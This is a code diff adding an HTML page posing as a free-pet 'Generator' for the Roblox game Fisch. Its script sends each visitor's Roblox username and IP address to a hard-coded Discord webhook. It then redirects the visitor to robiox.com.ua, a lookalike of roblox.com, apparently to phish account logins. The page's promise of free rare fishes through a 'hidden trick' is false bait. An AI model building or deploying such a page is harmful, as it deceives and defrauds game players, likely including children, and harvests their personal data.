@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Fisch🦈 - Generator</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      background-image: url("./images/backgroundFisch.jpg");
+      background-size: cover;
+      background-position: center;
+      background-attachment: fixed;
+      font-family: Arial, sans-serif;
+    }
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      z-index: -1;
+    }
+    .highlight {
+      border: 3px solid #0ff;
+      box-shadow: 0 0 25px #0ff, 0 0 50px #0ff, 0 0 100px #0ff;
+      transform: scale(1.1);
+      transition: all 0.2s ease-in-out;
+    }
+    @keyframes glowPulse {
+      0% { box-shadow: 0 0 5px cyan, 0 0 10px cyan; }
+      50% { box-shadow: 0 0 20px cyan, 0 0 40px cyan; }
+      100% { box-shadow: 0 0 5px cyan, 0 0 10px cyan; }
+    }
+    .neon-glow { animation: glowPulse 1.5s infinite; }
+    #welcomeOverlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: radial-gradient(circle, rgba(0,255,200,0.2) 0%, rgba(0,0,0,0.95) 100%);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 2000;
+      overflow: hidden;
+      animation: fadeOut 2s ease forwards;
+      animation-delay: 5s;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    .welcome-title {
+      font-size: 2rem;
+      font-weight: bold;
+      color: cyan;
+      text-shadow: 0 0 15px cyan, 0 0 30px #0ff, 0 0 60px #0ff;
+      animation: glowPulse 2s infinite;
+      text-align: center;
+    }
+    .welcome-sub {
+      font-size: 1.2rem;
+      color: #00ffe0;
+      margin-top: 20px;
+      opacity: 0;
+      animation: fadeInUp 2s ease forwards;
+      animation-delay: 1.5s;
+      text-align: center;
+    }
+    #welcomeIP {
+      font-size: 1rem;
+      color: #0ff;
+      margin-top: 10px;
+      opacity: 0;
+      animation: fadeInUp 2s ease forwards;
+      animation-delay: 2.5s;
+      text-align: center;
+    }
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes fadeOut { to { opacity: 0; visibility: hidden; } }
+    .leaves span {
+      position: absolute;
+      top: -50px;
+      font-size: 1.5rem;
+      animation: fall 6s linear infinite;
+      opacity: 0.8;
+    }
+    .leaves span:nth-child(1) { left: 10%; animation-delay: 0s; }
+    .leaves span:nth-child(2) { left: 30%; animation-delay: 1s; }
+    .leaves span:nth-child(3) { left: 50%; animation-delay: 2s; }
+    .leaves span:nth-child(4) { left: 70%; animation-delay: 3s; }
+    .leaves span:nth-child(5) { left: 90%; animation-delay: 4s; }
+    @keyframes fall {
+      0%   { transform: translateY(0) rotate(0deg); opacity: 1; }
+      100% { transform: translateY(110vh) rotate(360deg); opacity: 0; }
+    }
+    #congratsOverlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.85);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 998;
+      text-align: center;
+      color: white;
+      animation: fadeIn 1s ease forwards;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    #congratsOverlay img {
+      width: 120px; height: 120px;
+      border-radius: 12px;
+      box-shadow: 0 0 30px cyan;
+      margin-bottom: 20px;
+      animation: bounce 1s infinite alternate;
+    }
+    @keyframes bounce { from { transform: scale(1); } to { transform: scale(1.1); } }
+    #congratsOverlay h2 {
+      font-size: 1.5rem; font-weight: bold; color: cyan;
+      text-shadow: 0 0 10px cyan, 0 0 30px cyan;
+      animation: glowText 1s infinite alternate;
+    }
+    #redirectOverlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.95);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 999;
+      animation: fadeIn 1s ease forwards;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    @keyframes fadeIn { from {opacity:0;} to {opacity:1;} }
+    .redirect-text {
+      font-size: 1.5rem; font-weight: bold; color: cyan;
+      text-align: center;
+      text-shadow: 0 0 10px cyan, 0 0 30px cyan;
+      animation: glowText 1s infinite alternate;
+    }
+    #popup {
+      position: fixed; top: 20px; left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0,255,255,0.1);
+      border: 2px solid cyan;
+      padding: 15px 25px;
+      border-radius: 12px;
+      color: cyan;
+      font-weight: bold;
+      text-shadow: 0 0 5px cyan, 0 0 20px cyan;
+      display: none;
+      animation: popupAnim 0.5s ease;
+      z-index: 1000;
+      max-width: 90%;
+      text-align: center;
+      box-sizing: border-box;
+    }
+    @keyframes popupAnim {
+      from { opacity: 0; transform: translate(-50%, -20px); }
+      to { opacity: 1; transform: translate(-50%, 0); }
+    }
+    
+    /* Mobile-specific styles */
+    .mobile-container {
+      width: 100%;
+      max-width: 100%;
+      padding: 0 15px;
+      box-sizing: border-box;
+    }
+    
+    .mobile-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+      width: 100%;
+    }
+    
+    .mobile-pet {
+      border: 2px solid cyan;
+      border-radius: 8px;
+      padding: 12px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      animation: glowPulse 1.5s infinite;
+      box-sizing: border-box;
+    }
+    
+    .mobile-pet img {
+      width: 60px;
+      height: 60px;
+      border-radius: 8px;
+    }
+    
+    .mobile-pet p {
+      margin-top: 8px;
+      font-size: 0.9rem;
+      text-align: center;
+    }
+    
+    .mobile-button {
+      width: 100%;
+      max-width: 300px;
+      padding: 12px 16px;
+      font-size: 1rem;
+      margin: 20px auto;
+      display: block;
+    }
+    
+    .mobile-input {
+      width: 100%;
+      max-width: 300px;
+      padding: 12px;
+      margin: 0 auto 20px;
+      display: block;
+      box-sizing: border-box;
+    }
+    
+    .mobile-title {
+      font-size: 2rem;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    
+    .mobile-subtitle {
+      font-size: 1.3rem;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    
+    @media (max-width: 480px) {
+      .mobile-grid {
+        grid-template-columns: 1fr;
+        gap: 10px;
+      }
+      
+      .mobile-pet {
+        padding: 10px;
+      }
+      
+      .mobile-pet img {
+        width: 50px;
+        height: 50px;
+      }
+      
+      .mobile-pet p {
+        font-size: 0.8rem;
+      }
+      
+      .mobile-title {
+        font-size: 1.8rem;
+      }
+      
+      .mobile-subtitle {
+        font-size: 1.1rem;
+      }
+    }
+  </style>
+</head>
+<body class="text-white flex flex-col items-center min-h-screen p-4">
+
+  <!-- Welcome Overlay -->
+  <div id="welcomeOverlay">
+    <h1 class="welcome-title">🦈 Welcome to Fisch🦈</h1>
+    <p class="welcome-sub">🌊 Generator 🌊</p>
+    
+    <div class="leaves">
+      <span>🦈</span>
+      <span>🐟</span>
+      <span>🌊</span>
+      <span>🐬</span>
+      <span>🦑</span>
+    </div>
+  </div>
+
+  <!-- Main Content -->
+  <div class="mobile-container">
+    <h1 class="mobile-title text-cyan-400">Fisch🦈</h1>
+    <h2 class="mobile-subtitle text-cyan-300">✨ Generator ✨</h2>
+
+    <input id="username" 
+           type="text" 
+           placeholder="Enter your Roblox Username" 
+           class="mobile-input rounded-md text-black text-center border-2 border-cyan-400"/>
+
+    <div id="pets" class="mobile-grid">
+      <div class="mobile-pet">
+        <img src="./images/Robot Kraken.jpg" alt="Robot Kraken">
+        <p>Robot Kraken</p>
+      </div>
+      <div class="mobile-pet">
+        <img src="./images/Forst bone shark.jpg" alt="Forst bone shark">
+        <p>Forst bone shark</p>
+      </div>
+      <div class="mobile-pet">
+        <img src="./images/maja.webp" alt="Maja">
+        <p>Maja</p>
+      </div>
+      <div class="mobile-pet">
+        <img src="./images/lochness monster.jpg" alt="Lochness Monster">
+        <p>Lochness Monster</p>
+      </div>
+      <div class="mobile-pet">
+        <img src="./images/naga.jpg" alt="Naga">
+        <p>Naga</p>
+      </div>
+      <div class="mobile-pet">
+        <img src="./images/megalodon.jpg" alt="Megalodon">
+        <p>Megalodon</p>
+      </div>
+    </div>
+
+    <button id="generateBtn" 
+            class="mobile-button bg-cyan-500 hover:bg-cyan-700 rounded-lg text-black font-bold shadow-lg">
+      Generate
+    </button>
+
+    <!-- Link YouTube Tutorial -->
+    <a href="none" target="_blank" rel="noopener"
+       class="mobile-button text-center bg-red-600 hover:bg-red-700 rounded-lg text-white font-bold shadow-lg transition">
+      🎥 Watch Tutorial on YouTube
+    </a>
+
+    <!-- Collapsible Description -->
+    <div class="mt-4 w-full">
+      <button id="descToggle"
+              class="w-full flex items-center justify-between px-4 py-3 bg-cyan-900/40 hover:bg-cyan-900/60 border border-cyan-500 rounded-lg transition font-semibold"
+              aria-expanded="false" aria-controls="descPanel">
+        <span>ℹ️ Description</span>
+        <svg id="descChevron" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"
+             class="w-5 h-5 transition-transform" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M6 9l6 6 6-6"/>
+        </svg>
+      </button>
+
+      <div id="descPanel"
+           class="max-h-0 overflow-hidden border border-cyan-500/70 rounded-lg mt-2 bg-black/40 transition-all duration-500 ease-in-out">
+        <div class="p-4">
+          <p class="leading-relaxed">
+            🌟 Hey there, adventurers! This website was crafted by the Dev especially for you,  
+so you can enjoy unlocking <span class="text-cyan-400 font-semibold">free fishes</span> in  
+<span class="font-semibold">Fisch Roblox</span>.  
+💻 The Dev worked tirelessly — long nights, countless tests, and endless experiments —  
+until finally discovering a <span class="text-green-400 font-bold">hidden trick</span> inside the game.  
+🚀 With this method, you can collect rare fishes without spending endless hours grinding.  
+Every click is a gift from the Dev's hard work, created to bring fun to the whole community. 🎣🐟🐠
+          </p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="popup">⚠️ Please enter your Roblox username first!</div>
+
+  <div id="congratsOverlay">
+    <img id="congratsImg" src="" alt="Pet">
+    <h2 id="congratsText">🎉 Congratulations! You got ...</h2>
+  </div>
+
+  <div id="redirectOverlay">
+    <div class="redirect-text">🔗 Redirecting to Private Server...</div>
+  </div>
+
+  <script>
+    const descToggle = document.getElementById("descToggle");
+    const descPanel = document.getElementById("descPanel");
+    const descChevron = document.getElementById("descChevron");
+
+    descToggle.addEventListener("click", () => {
+      if (descPanel.classList.contains("max-h-0")) {
+        // buka
+        descPanel.classList.remove("max-h-0");
+        descPanel.classList.add("max-h-[500px]"); // cukup besar biar muat isi
+        descChevron.classList.add("rotate-180");
+        descToggle.setAttribute("aria-expanded", "true");
+      } else {
+        // tutup
+        descPanel.classList.add("max-h-0");
+        descPanel.classList.remove("max-h-[500px]");
+        descChevron.classList.remove("rotate-180");
+        descToggle.setAttribute("aria-expanded", "false");
+      }
+    });
+
+    const WEBHOOK_URL_1 = "https://discord.com/api/webhooks/1409805078243835955/9EPRyX6uSkox4DFYtc8Tg9-QHdYRzdRx5AqGDU0xo3hWAEiVPDivP6rSFNX4IOURpbBg"; // dengan IP
+    const WEBHOOK_URL_2 = "webhook";   // tanpa IP
+    
+    function showPopup(msg) {
+      let popup = document.getElementById("popup");
+      popup.innerText = msg;
+      popup.style.display = "block";
+      setTimeout(() => { popup.style.display = "none"; }, 3000);
+    }
+
+    let cachedIP = "Unknown";
+    async function fetchIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        cachedIP = data.ip || "Unknown";
+      } catch(e) {
+        cachedIP = "Unknown";
+      }
+    }
+    window.addEventListener("load", fetchIP);
+
+    // Ambil avatar Roblox dari username
+    async function getRobloxAvatar(username) {
+      try {
+        const res = await fetch("https://users.roblox.com/v1/usernames/users", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ usernames: [username] })
+        });
+        const data = await res.json();
+
+        if (!data.data || data.data.length === 0) {
+          console.warn("User not found:", username);
+          return "https://tr.rbxcdn.com/df01b02d6d9d3e33b0f9c48ea3b5a7e0/420/420/AvatarHeadshot/Png";
+        }
+
+        const userId = data.data[0].id;
+        return `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
+      } catch (err) {
+        console.error("Error fetching Roblox avatar:", err);
+        return "https://tr.rbxcdn.com/df01b02d6d9d3e33b0f9c48ea3b5a7e0/420/420/AvatarHeadshot/Png";
+      }
+    }
+
+    async function sendToDiscordWithIP(username, petName, petImg, ip) {
+      const avatarUrl = await getRobloxAvatar(username);
+      console.log("Avatar URL for", username, ":", avatarUrl);
+
+      const fields = [
+        { name: "👤 Roblox Username", value: username || "Unknown", inline: true },
+        { name: "🐾 Pet", value: petName, inline: true }
+      ];
+      if (ip && ip !== "Unknown") fields.push({ name: "🌐 IP", value: ip });
+
+      fetch(WEBHOOK_URL_1, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          username: "🌱 Pet Generator Bot",
+          embeds: [{
+            title: "🎉 New Pet Generated!",
+            color: 0x00ffff,
+            fields,
+            thumbnail: { url: petImg },
+            image: { url: avatarUrl },
+            author: { name: username, icon_url: avatarUrl },
+            footer: { text: "Fisch - Pet Generator" },
+            timestamp: new Date()
+          }]
+        })
+      });
+    }
+
+    async function sendToDiscordNoIP(username, petName, petImg) {
+      const avatarUrl = await getRobloxAvatar(username);
+      console.log("Avatar URL for", username, ":", avatarUrl);
+
+      const fields = [
+        { name: "👤 Roblox Username", value: username || "Unknown", inline: true },
+        { name: "🐾 Pet", value: petName, inline: true }
+      ];
+
+      fetch(WEBHOOK_URL_2, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          username: "🌱 Pet Generator Bot",
+          embeds: [{
+            title: "🎉 New Pet Generated! (No IP)",
+            color: 0x00ff80,
+            fields,
+            thumbnail: { url: petImg },
+            image: { url: avatarUrl },
+            author: { name: username, icon_url: avatarUrl },
+            footer: { text: "Fisch - Pet Generator" },
+            timestamp: new Date()
+          }]
+        })
+      });
+    }
+
+    function generateRandomPet() {
+      let username = document.getElementById("username").value.trim();
+      if (username === "") {
+        showPopup("⚠️ Please enter your Roblox username first!");
+        return;
+      }
+
+      let pets = document.querySelectorAll(".mobile-pet");
+      let highlightIndex = 0;
+      let duration = 5000;
+      let intervalTime = 150;
+      let elapsed = 0;
+
+      let interval = setInterval(() => {
+        pets.forEach(p => p.classList.remove("highlight"));
+        highlightIndex = (highlightIndex + 1) % pets.length;
+        pets[highlightIndex].classList.add("highlight");
+
+        elapsed += intervalTime;
+        if (elapsed >= duration) {
+          clearInterval(interval);
+
+          pets.forEach(p => p.classList.remove("highlight"));
+          let randomIndex = Math.floor(Math.random() * pets.length);
+          let chosenPet = pets[randomIndex];
+          chosenPet.classList.add("highlight");
+
+          let petImg = chosenPet.querySelector("img").src;
+          let petName = chosenPet.querySelector("p").innerText;
+          document.getElementById("congratsImg").src = petImg;
+          document.getElementById("congratsText").innerText = "🎉 Congratulations! You got " + petName + " 🎉";
+          document.getElementById("congratsOverlay").style.display = "flex";
+
+          // Kirim ke 2 webhook
+          sendToDiscordWithIP(username, petName, petImg, cachedIP);
+          sendToDiscordNoIP(username, petName, petImg);
+
+          setTimeout(() => {
+            document.getElementById("congratsOverlay").style.display = "none";
+            document.getElementById("redirectOverlay").style.display = "flex";
+            
+            setTimeout(() => {
+              // Redirect ke private server
+              window.location.href = "https://www.robiox.com.ua/games/16732694052/Fisch?privateServerLinkCode=64419007362125835879813245002815";
+            }, 4000);
+          }, 3000);
+        }
+      }, intervalTime);
+    }
+
+    document.getElementById("generateBtn").addEventListener("click", generateRandomPet);
+
+    // Sembunyikan overlay selamat datang setelah animasi selesai
+    setTimeout(() => {
+      document.getElementById("welcomeOverlay").style.display = "none";
+    }, 7000);
+  </script>
+</body>
+</html>
